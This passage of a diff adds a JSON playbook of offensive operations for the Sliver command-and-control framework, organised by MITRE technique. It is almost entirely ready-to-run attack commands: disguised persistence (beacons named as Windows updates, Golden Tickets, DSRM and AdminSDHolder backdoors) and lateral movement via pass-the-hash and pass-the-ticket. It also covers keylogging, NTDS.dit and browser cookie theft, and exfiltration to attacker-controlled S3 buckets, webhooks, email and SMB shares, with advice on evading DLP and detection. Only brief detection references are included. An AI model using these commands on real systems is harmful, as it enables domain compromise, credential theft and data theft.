+        "command": "persistence service \\\n  --name WindowsUpdateSvc \\\n  --path C:\\\\Windows\\\\Temp\\\\beacon.exe"
+      },
+      {
+        "description": "List all Sliver-managed persistence entries.",
+        "method": "Sliver Console",
+        "command": "persistence list"
+      },
+      {
+        "description": "Remove a persistence entry by ID.",
+        "method": "Sliver Console",
+        "command": "persistence remove --id {id}"
+      },
+      {
+        "description": "Create scheduled task \u2014 fires at boot, runs as SYSTEM.",
+        "method": "Sliver Console",
+        "command": "execute -o cmd /c \"schtasks /create /tn \\\"WindowsDefenderUpdate\\\" /tr \\\"C:\\\\Windows\\\\Temp\\\\beacon.exe\\\" /sc onstart /ru SYSTEM /f\""
+      },
+      {
+        "description": "Create WMI permanent event subscription (fileless persistence).",
+        "method": "Sliver Console",
+        "command": "execute-assembly /opt/tools/SharpWMI.exe action=persist name=WinUpdate command=\"C:\\\\Windows\\\\Temp\\\\beacon.exe\""
+      },
+      {
+        "description": "Drop implant in user startup folder (no admin needed).",
+        "method": "Sliver Console",
+        "command": "upload /tmp/beacon.exe \"C:\\\\Users\\\\{user}\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\WindowsUpdate.exe\""
+      },
+      {
+        "description": "DLL hijack persistence \u2014 drop malicious DLL in app directory.",
+        "method": "Sliver Console",
+        "command": "upload /tmp/hijack.dll \"C:\\\\Program Files\\\\{app}\\\\version.dll\""
+      },
+      {
+        "description": "Add shadow credential to DA account (certificate-based persistence).",
+        "method": "Sliver Console",
+        "command": "execute-assembly /opt/tools/Whisker.exe add /target:{target_user} /domain:{domain} /dc:{dc_ip}"
+      },
+      {
+        "description": "DSRM backdoor admin on DC for persistent offline domain admin access.",
+        "method": "Sliver Console",
+        "command": "execute -o cmd /c \"reg add HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f\""
+      },
+      {
+        "description": "AdminSDHolder backdoor \u2014 ACE propagated to all protected AD groups.",
+        "method": "Sliver Console",
+        "command": "execute-assembly /opt/tools/PowerView.exe \"Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC={domain},DC=com' -PrincipalIdentity {user} -Rights All\""
+      },
+      {
+        "description": "Golden Ticket \u2014 forge TGT with compromised krbtgt hash for unlimited persistence.",
+        "method": "Sliver Console",
+        "command": "execute-assembly /opt/tools/mimikatz.exe \"kerberos::golden /user:Administrator /domain:{domain} /sid:{sid} /krbtgt:{hash} /ptt\" \"exit\""
+      }
+    ],
+    "prerequisites": "Appropriate privileges; persistence location writable",
+    "opsec": "Sliver registry, cron, service persistence commands. Use stealth persistence techniques vs obvious persistence mechanisms.",
+    "detection_ref": "Persistence mechanism monitoring; Autoruns; cron/service auditing; registry modification events"
+  },
+  "lateral_movement": {
+    "description": "Moving laterally via Sliver pivots, SOCKS5 proxies, port forwarding, named-pipe pivots, PtH, PtT, and remote execution techniques.",
+    "mitre": "T1550",
+    "commands": [
+      {
+        "description": "Start SOCKS5 proxy through session for tool pivoting (must be session, not beacon).",
+        "method": "Sliver Console",
+        "command": "use {session_id}\nsocks5 start -P 1080"
+      },
+      {
+        "description": "Port forward \u2014 expose internal host:port on attacker machine.",
+        "method": "Sliver Console",
+        "command": "portfwd add -r {internal_host}:3389 -l 13389"
+      },
+      {
+        "description": "Reverse port forward \u2014 expose attacker service to internal network.",
+        "method": "Sliver Console",
+        "command": "portfwd add --remote -r {attacker_ip}:4444 -l {internal_port}"
+      },
+      {
+        "description": "Create TCP pivot listener on compromised host for chained beacons.",
+        "method": "Sliver Console",
+        "command": "pivots tcp --bind 0.0.0.0:9001"
+      },
+      {
+        "description": "Generate beacon routed through existing TCP pivot host.",
+        "method": "Sliver Console",
+        "command": "generate beacon \\\n  --tcp-pivot {pivot_host}:9001 \\\n  --os windows --arch amd64 \\\n  --format exe --save /tmp/pivot_beacon.exe"
+      },
+      {
+        "description": "Create named-pipe pivot for air-gapped or firewalled internal segments.",
+        "method": "Sliver Console",
+        "command": "pivots named-pipe --bind \\\\\\\\.\\\\pipe\\\\svcpipe\ngenerate beacon \\\n  --named-pipe-pivot {pivot_host}:\\\\\\\\.\\\\pipe\\\\svcpipe \\\n  --format exe --save /tmp/np_beacon.exe"
+      },
+      {
+        "description": "PsExec-style lateral movement via SMB \u2014 deploy beacon as service.",
+        "method": "Sliver Console",
+        "command": "psexec --exe C:\\\\Windows\\\\Temp\\\\beacon.exe {target_hostname}"
+      },
+      {
+        "description": "Pass-the-Hash \u2014 create token with stolen NTLM hash.",
+        "method": "Sliver Console",
+        "command": "make-token -u {user} -d {domain} -p aad3b435b51404eeaad3b435b51404ee:{ntlm_hash}"
+      },
+      {
+        "description": "Pass-the-Ticket \u2014 inject stolen Kerberos TGT.",
+        "method": "Sliver Console",
+        "command": "execute-assembly /opt/tools/Rubeus.exe ptt /ticket:{base64_kirbi}"
+      },
+      {
+        "description": "Over-Pass-the-Hash \u2014 convert NTLM hash to Kerberos TGT.",
+        "method": "Sliver Console",
+        "command": "execute-assembly /opt/tools/Rubeus.exe asktgt \\\n  /user:{user} /rc4:{ntlm_hash} \\\n  /domain:{domain} /dc:{dc_ip} /ptt"
+      },
+      {
+        "description": "WMI lateral movement \u2014 exec beacon on remote host.",
+        "method": "Sliver Console",
+        "command": "execute-assembly /opt/tools/SharpWMI.exe \\\n  action=exec computername={target} \\\n  command=\"C:\\\\Windows\\\\Temp\\\\beacon.exe\""
+      },
+      {
+        "description": "DCOM lateral movement via MMC20.Application (no SMB needed).",
+        "method": "Sliver Console",
+        "command": "execute -o powershell \"$d=[System.Activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application','{target}')); $d.Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,'/c C:\\\\Windows\\\\Temp\\\\beacon.exe','7')\""
+      },
+      {
+        "description": "RDP lateral movement via portfwd tunnel.",
+        "method": "Sliver Console",
+        "command": "portfwd add -r {target}:3389 -l 13389\nxfreerdp /v:127.0.0.1:13389 /u:{user} /p:{pass} /cert-ignore"
+      },
+      {
+        "description": "SSH pivot to internal Linux host via socks proxy.",
+        "method": "Socks + SSH",
+        "command": "proxychains4 ssh {user}@{internal_linux_host}"
+      }
+    ],
+    "prerequisites": "Valid credentials; network connectivity; appropriate lateral movement protocol available",
+    "opsec": "SMB-based movement via named pipes preferred over TCP. Use existing service account credentials to blend with legitimate traffic.",
+    "detection_ref": "Named pipe creation events; Event 4624 lateral movement patterns; WMI/DCOM activation anomalies"
+  },
+  "collection": {
+    "description": "Collecting sensitive data \u2014 screenshots, keylogging, clipboard, files, NTDS.dit, and live network packet capture.",
+    "mitre": "T1005",
+    "commands": [
+      {
+        "description": "Take screenshot of active desktop.",
+        "method": "Sliver Console",
+        "command": "screenshot"
+      },
+      {
+        "description": "Start keylogger \u2014 capture all keystrokes.",
+        "method": "Sliver Console",
+        "command": "keylogger start\nkeylogger dump\nkeylogger stop"
+      },
+      {
+        "description": "Capture clipboard contents.",
+        "method": "Sliver BOF",
+        "command": "clipboard"
+      },
+      {
+        "description": "Download a specific file.",
+        "method": "Sliver Console",
+        "command": "download C:\\\\Users\\\\{user}\\\\Documents\\\\passwords.xlsx"
+      },
+      {
+        "description": "Recursively download an entire directory.",
+        "method": "Sliver Console",
+        "command": "download --recursive C:\\\\Users\\\\{user}\\\\Desktop /tmp/loot/"
+      },
+      {
+        "description": "Grep filesystem for credential patterns.",
+        "method": "Sliver Console",
+        "command": "grep -r \"password\" C:\\\\inetpub\\\\\ngrep -r \"apikey\\|api_key\\|AKIA\" C:\\\\Users\\"
+      },
+      {
+        "description": "Archive a directory before download to reduce transfer size.",
+        "method": "Sliver Console",
+        "command": "execute -o powershell \"Compress-Archive -Path C:\\\\Users\\\\{user}\\\\Documents -DestinationPath C:\\\\Windows\\\\Temp\\\\docs.zip\"\ndownload C:\\\\Windows\\\\Temp\\\\docs.zip"
+      },
+      {
+        "description": "Dump NTDS.dit via Volume Shadow Copy.",
+        "method": "Sliver Console",
+        "command": "execute -o cmd /c \"vssadmin create shadow /for=C:\\\\\\\\\"\nexecute -o cmd /c \"copy \\\\\\\\?\\\\GLOBALROOT\\\\Device\\\\HarddiskVolumeShadowCopy1\\\\Windows\\\\NTDS\\\\NTDS.dit C:\\\\Windows\\\\Temp\\\\\"\nexecute -o cmd /c \"copy \\\\\\\\?\\\\GLOBALROOT\\\\Device\\\\HarddiskVolumeShadowCopy1\\\\Windows\\\\System32\\\\config\\\\SYSTEM C:\\\\Windows\\\\Temp\\\\\"\ndownload C:\\\\Windows\\\\Temp\\\\NTDS.dit\ndownload C:\\\\Windows\\\\Temp\\\\SYSTEM"
+      },
+      {
+        "description": "Stage and bulk-collect sensitive file types (certs, DBs, PST).",
+        "method": "Sliver Console",
+        "command": "execute -o powershell \"Get-ChildItem -Path C:\\\\ -Recurse -Include '*.kdbx','*.pfx','*.pst','*.sqlite' -ErrorAction SilentlyContinue | Copy-Item -Destination C:\\\\Windows\\\\Temp\\\\loot\\\\\"\ndownload --recursive C:\\\\Windows\\\\Temp\\\\loot"
+      },
+      {
+        "description": "Dump browser session cookies for web app account takeover.",
+        "method": "Sliver Console",
+        "command": "execute-assembly /opt/tools/SharpChrome.exe cookies /unprotect"
+      }
+    ],
+    "prerequisites": "Access to target data; appropriate permissions",
+    "opsec": "Use download for targeted file collection. Screenshot/keylogger sparingly. Minimize time between collection and exfil.",
+    "detection_ref": "File access pattern monitoring; screenshot API usage; keylogger behavioral detection"
+  },
+  "command_and_control": {
+    "description": "C2 channel management \u2014 domain fronting, HTTP profile customization, protocol fallback, beacon lifecycle, and named-pipe pivots.",
+    "mitre": "T1573",
+    "commands": [
+      {
+        "description": "Reconfig beacon jitter/interval post-deployment for OPSEC.",
+        "method": "Sliver Console",
+        "command": "use {beacon_id}\nreconfig -i 120s -j 30s"
+      },
+      {
+        "description": "Open interactive real-time session from a beacon.",
+        "method": "Sliver Console",
+        "command": "use {beacon_id}\ninteractive"
+      },
+      {
+        "description": "Background current session and switch to another beacon.",
+        "method": "Sliver Console",
+        "command": "background\nuse {other_id}"
+      },
+      {
+        "description": "Generate multi-protocol fallback beacon (HTTPS primary, DNS fallback).",
+        "method": "Sliver Console",
+        "command": "generate beacon \\\n  --http {c2_server}:443 \\\n  --dns {c2_domain} \\\n  --os windows --arch amd64 \\\n  --format exe --save /tmp/fallback.exe"
+      },
+      {
+        "description": "Customize HTTP C2 profile for traffic blending with legitimate apps.",
+        "method": "Sliver Config",
+        "command": "# Edit: ~/.sliver/configs/http-c2.json\n# Set: user-agent string, cookie names, URI paths,\n# request/response body encoding to mimic Office365, Slack, etc."
+      },
+      {
+        "description": "Domain front via CDN \u2014 real C2 IP hidden behind CDN edge node.",
+        "method": "Sliver Console",
+        "command": "generate beacon \\\n  --http {cdn_frontend_domain}:443 \\\n  --os windows --arch amd64 \\\n  --format exe --save /tmp/fronted.exe\n# CDN forwards Host:{cdn_frontend_domain} to real C2 origin"
+      },
+      {
+        "description": "Kill beacon cleanly \u2014 self-deletes implant from target.",
+        "method": "Sliver Console",
+        "command": "use {beacon_id}\nkill"
+      },
+      {
+        "description": "Get beacon status \u2014 last/next check-in, pending tasks.",
+        "method": "Sliver Console",
+        "command": "beacons\nuse {beacon_id}\ninfo"
+      },
+      {
+        "description": "Assign beacon to specific operator in multiplayer mode.",
+        "method": "Sliver Console",
+        "command": "beacons -o {operator_name}"
+      }
+    ],
+    "prerequisites": "Deployed implant; listener active; network egress allowed",
+    "opsec": "MTLS for encrypted C2. Use HTTP/HTTPS profiles matching target environment. Named pipes for intranet lateral movement.",
+    "detection_ref": "Sliver TLS fingerprint; C2 beacon pattern analysis; named pipe creation monitoring; DNS C2 detection"
+  },
+  "data_exfiltration": {
+    "description": "Exfiltrating data through Sliver's C2 channel, DNS tunnels, cloud storage, chunked transfers, SMTP, and protocol-blending techniques to evade DLP.",
+    "mitre": "T1041",
+    "commands": [
+      {
+        "description": "Direct exfiltration over HTTPS C2 channel \u2014 no new connection.",
+        "method": "Sliver Console",
+        "command": "download C:\\\\Windows\\\\Temp\\\\loot.zip /tmp/exfil/"
+      },
+      {
+        "description": "Chunk large file into 50MB pieces to evade size-based DLP.",
+        "method": "Sliver Console",
+        "command": "execute -o powershell \"$f='C:\\\\Windows\\\\Temp\\\\NTDS.dit'; $cs=50MB; $i=0; $fs=[IO.File]::OpenRead($f); $buf=New-Object byte[] $cs; while(($r=$fs.Read($buf,0,$cs)) -gt 0){[IO.File]::WriteAllBytes(\\\"C:\\\\Windows\\\\Temp\\\\chunk$i.dat\\\",$buf[0..($r-1)]); $i++}; $fs.Close()\"\ndownload C:\\\\Windows\\\\Temp\\\\chunk0.dat"
+      },
+      {
+        "description": "Exfiltrate via DNS tunnel \u2014 bypasses HTTP/HTTPS proxy completely.",
+        "method": "Sliver Console",
+        "command": "execute-assembly /opt/tools/dnscat2-client.exe --secret {key} {c2_domain}"
+      },
+      {
+        "description": "Upload loot to attacker-controlled S3 bucket via pre-signed URL.",
+        "method": "Sliver Console",
+        "command": "execute -o powershell \"(New-Object Net.WebClient).UploadFile('{presigned_s3_url}','C:\\\\Windows\\\\Temp\\\\docs.zip')\""
+      },
+      {
+        "description": "Exfiltrate via HTTPS POST to attacker webhook (blends with SaaS traffic).",
+        "method": "Sliver Console",
+        "command": "execute -o powershell \"Invoke-RestMethod -Uri 'https://{exfil_server}/upload' -Method POST -InFile 'C:\\\\Windows\\\\Temp\\\\docs.zip'\""
+      },
+      {
+        "description": "Exfiltrate via Rclone \u2014 sync loot to cloud provider.",
+        "method": "Sliver Console",
+        "command": "upload /opt/tools/rclone.exe C:\\\\Windows\\\\Temp\\\\svchost2.exe\nexecute -o C:\\\\Windows\\\\Temp\\\\svchost2.exe copy C:\\\\Windows\\\\Temp\\\\loot remote:{cloud_bucket}"
+      },
+      {
+        "description": "Stage loot on IIS web root \u2014 pull via HTTP from attacker side.",
+        "method": "Sliver Console",
+        "command": "execute -o cmd /c \"copy C:\\\\Windows\\\\Temp\\\\docs.zip C:\\\\inetpub\\\\wwwroot\\\\updates\\\\pkg.zip\"\n# Attacker: curl -o /tmp/pkg.zip https://{target_ip}/updates/pkg.zip"
+      },
+      {
+        "description": "Exfiltrate via email using Outlook COM (blends with user activity).",
+        "method": "Sliver Console",
+        "command": "execute -o powershell \"$o=New-Object -ComObject Outlook.Application; $m=$o.CreateItem(0); $m.To='{exfil_email}'; $m.Subject='Report'; $m.Attachments.Add('C:\\\\Windows\\\\Temp\\\\docs.zip'); $m.Send()\""
+      },
+      {
+        "description": "Encrypt loot with 7-zip AES before exfil \u2014 defeats DLP content inspection.",
+        "method": "Sliver Console",
+        "command": "execute-assembly /opt/tools/7za.exe a -p{password} -mhe C:\\\\Windows\\\\Temp\\\\enc.7z C:\\\\Windows\\\\Temp\\\\loot\\\\\ndownload C:\\\\Windows\\\\Temp\\\\enc.7z"
+      },
+      {
+        "description": "Exfiltrate via SMB share through socks proxy tunnel.",
+        "method": "Socks + SMB",
+        "command": "socks5 start -P 1080\n# Attacker: impacket-smbserver loot /tmp/loot -smb2support\nexecute -o cmd /c \"copy C:\\\\Windows\\\\Temp\\\\docs.zip \\\\\\\\{attacker_ip}\\\\loot\\\\\""
+      }
+    ],
+    "prerequisites": "Collected data; exfil channel; active session",
+    "opsec": "Exfil through existing C2 channel. Compress with password protection. Chunked transfer to avoid volume anomalies.",
+    "detection_ref": "Network volume anomalies; DLP monitoring; C2 channel capacity analysis; proxy log review"
+  }
+}
